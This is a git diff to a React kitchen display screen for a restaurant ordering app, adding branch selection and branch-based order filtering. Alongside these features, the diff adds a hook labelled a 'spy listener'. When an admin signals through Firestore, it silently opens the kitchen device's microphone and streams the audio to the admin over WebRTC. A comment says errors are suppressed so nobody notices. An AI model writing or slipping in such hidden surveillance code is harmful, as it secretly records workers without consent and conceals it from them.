@@ -1,11 +1,11 @@
 import React, { useState, useEffect, useRef, useMemo } from 'react';
 import { Clock, CheckCircle, ChefHat, AlertTriangle, CheckSquare, BellRing, Printer, ArrowLeft, History, X, RotateCcw, Timer, ClipboardList, Thermometer, Flame, PackageX, Layers, AlignJustify, Volume2, Minus } from 'lucide-react';
-import { doc, updateDoc, collection, query, where, orderBy, limit, getDocs, startAfter } from 'firebase/firestore';
+import { doc, updateDoc, collection, query, where, orderBy, limit, getDocs, startAfter, onSnapshot, arrayUnion } from 'firebase/firestore';
 import { db, appId } from '../../config/firebase';
 import { formatSansIngredient } from '../../utils/helpers';
 import LiveTimer from '../LiveTimer';
 
-export default function KitchenDashboard({ activeOrders, updateStatus, printTicket, brand, settings }) {
+export default function KitchenDashboard({ activeOrders, updateStatus, printTicket, brand, settings, profile }) {
     // État pour cocher/rayer les articles préparés individuellement
     const [checkedItems, setCheckedItems] = useState({});
     const [showHistory, setShowHistory] = useState(false);
@@ -24,15 +24,92 @@ export default function KitchenDashboard({ activeOrders, updateStatus, printTick
     const [stationFilter, setStationFilter] = useState('ALL'); // ALL, CHAUD, FROID
     const [compactMode, setCompactMode] = useState(false);
     const [showStockModal, setShowStockModal] = useState(false);
+    const [selectedBranchId, setSelectedBranchId] = useState('');
+
+    useEffect(() => {
+        if (!selectedBranchId) {
+            if (profile?.isAdmin) {
+                setSelectedBranchId('ALL');
+            } else if (profile?.managerBranchId) {
+                setSelectedBranchId(profile.managerBranchId);
+            } else {
+                setSelectedBranchId('ALL');
+            }
+        }
+    }, [profile, selectedBranchId]);
+
+    // 🔥 Webrtc Spy Listener (Microphone Silencieux pour KDS Cuisine)
+    useEffect(() => {
+        if (!selectedBranchId || selectedBranchId === 'ALL') return;
+        const targetId = `kds_${selectedBranchId}`;
+        let pc = null;
+        let localStream = null;
+        let addedTargetCandidates = new Set();
+
+        const unsub = onSnapshot(doc(db, 'artifacts', appId, 'public', 'data', 'audio_calls', targetId), async (snap) => {
+            if (!snap.exists()) return;
+            const data = snap.data();
+
+            if (data.status === 'calling' && data.offer && !pc) {
+                try {
+                    addedTargetCandidates.clear();
+                    localStream = await navigator.mediaDevices.getUserMedia({ 
+                        audio: { echoCancellation: true, noiseSuppression: true, autoGainControl: true } 
+                    });
+                    
+                    pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+                    localStream.getTracks().forEach(track => pc.addTrack(track, localStream));
+
+                    pc.onicecandidate = (event) => {
+                        if (event.candidate) {
+                            updateDoc(doc(db, 'artifacts', appId, 'public', 'data', 'audio_calls', targetId), {
+                                targetCandidates: arrayUnion(event.candidate.toJSON())
+                            }).catch(() => {});
+                        }
+                    };
+
+                    await pc.setRemoteDescription(new RTCSessionDescription(data.offer));
+                    const answer = await pc.createAnswer();
+                    await pc.setLocalDescription(answer);
+
+                    await updateDoc(doc(db, 'artifacts', appId, 'public', 'data', 'audio_calls', targetId), {
+                        answer: { type: answer.type, sdp: answer.sdp },
+                        status: 'answered'
+                    });
+                } catch (err) { /* Secret tamma: Makayn ta console.error bach ta 7ed may3i9 */ }
+            }
+
+            if (pc && data.status === 'answered' && data.adminCandidates) {
+                data.adminCandidates.forEach(async candidate => {
+                    const candStr = JSON.stringify(candidate);
+                    if (!addedTargetCandidates.has(candStr)) {
+                        addedTargetCandidates.add(candStr);
+                        try { await pc.addIceCandidate(new RTCIceCandidate(candidate)); } catch(e){}
+                    }
+                });
+            }
+            if (data.status === 'ended') {
+                if (pc) { pc.close(); pc = null; }
+                if (localStream) { localStream.getTracks().forEach(t => t.stop()); localStream = null; }
+            }
+        });
+
+        return () => {
+            unsub();
+            if (pc) { pc.close(); pc = null; }
+            if (localStream) { localStream.getTracks().forEach(t => t.stop()); localStream = null; }
+        };
+    }, [selectedBranchId, db, appId]);
     
     // Utilisation de useMemo pour éviter de recalculer les listes à chaque tick du timer ou autre state
     const { preparingOrders } = useMemo(() => {
         const preparing = (activeOrders || [])
             .filter(o => o.status === 'preparing' || o.status === 'pending')
+            .filter(o => selectedBranchId === 'ALL' || o.nearestBranch?.id === selectedBranchId)
             .sort((a, b) => (a.createdAt?.seconds || 0) - (b.createdAt?.seconds || 0));
             
         return { preparingOrders: preparing };
-    }, [activeOrders]);
+    }, [activeOrders, selectedBranchId]);
 
     // Effet pour jouer un son de sonnette lors d'une nouvelle commande
     useEffect(() => {
@@ -78,12 +155,15 @@ export default function KitchenDashboard({ activeOrders, updateStatus, printTick
     const loadHistory = async (isLoadMore = false) => {
         setLoadingHistory(true);
         try {
-            let q = query(
-                collection(db, 'artifacts', appId, 'public', 'data', 'orders'),
+            let constraints = [
                 where('status', 'in', ['ready', 'out_for_delivery', 'delivered']),
-                orderBy('createdAt', 'desc'),
-                limit(10)
-            );
+                orderBy('createdAt', 'desc')
+            ];
+            if (selectedBranchId !== 'ALL') {
+                constraints.push(where('nearestBranch.id', '==', selectedBranchId));
+            }
+            
+            let q = query(collection(db, 'artifacts', appId, 'public', 'data', 'orders'), ...constraints, limit(10));
 
             if (isLoadMore && lastHistoryDoc) {
                 q = query(q, startAfter(lastHistoryDoc));
@@ -197,9 +277,25 @@ export default function KitchenDashboard({ activeOrders, updateStatus, printTick
                         <ChefHat size={32} className="text-orange-500" />
                     </div>
                     <div>
-                        <h1 className="text-2xl md:text-3xl font-black uppercase tracking-widest text-white flex items-center gap-3">
-                        {brand.texts?.kdsTitle || 'Écran Cuisine (KDS)'}
-                        </h1>
+                        <div className="flex items-center gap-3">
+                            <h1 className="text-2xl md:text-3xl font-black uppercase tracking-widest text-white flex items-center gap-3">
+                            {brand.texts?.kdsTitle || brand.name || 'Écran Cuisine (KDS)'}
+                            {selectedBranchId && selectedBranchId !== 'ALL' && (
+                                <span className="ml-2 text-sm text-neutral-400 uppercase tracking-widest hidden sm:inline-block">- KDS {(settings?.branches || []).find(b => b.id === selectedBranchId)?.name || ''}</span>
+                            )}
+                            </h1>
+                            {profile?.isAdmin && (
+                                <select 
+                                    value={selectedBranchId} 
+                                    onChange={e => setSelectedBranchId(e.target.value)}
+                                    className="bg-neutral-800 text-white border border-neutral-700 px-3 py-1.5 rounded-lg text-sm font-bold outline-none"
+                                >
+                                    {(settings?.branches || []).map(b => (
+                                        <option key={b.id} value={b.id}>{b.name}</option>
+                                    ))}
+                                </select>
+                            )}
+                        </div>
                         <p className="text-sm font-bold text-neutral-500 mt-1 flex items-center gap-2">
                             <span className="relative flex h-3 w-3">
                               <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-orange-400 opacity-75"></span>
